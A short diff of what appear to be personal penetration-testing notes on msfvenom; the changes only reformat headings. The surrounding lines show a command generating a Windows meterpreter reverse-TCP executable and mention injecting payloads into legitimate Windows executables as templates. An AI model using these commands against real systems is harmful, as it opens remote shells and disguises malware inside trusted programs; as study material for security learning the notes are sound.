@@ -11,7 +11,7 @@ x86 <- 32 bit
 -a <- architecture
 
 -p payload
-# Windows Examples
+##Windows Examples
 ```bash
 msfvenom -a x86 -p /windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > /home/ryzen/payload64.exe
 
@@ -92,7 +92,7 @@ but it is much smaller than windows payloads
 
 
 
-###		Injecting Payloads Into Windows Portable Executables 
+##Injecting Payloads Into Windows Portable Executables 
 
 msfvenom -x or --template for specify custom template also use -k or --keep to save behaviour and inject payload as a new thread
 
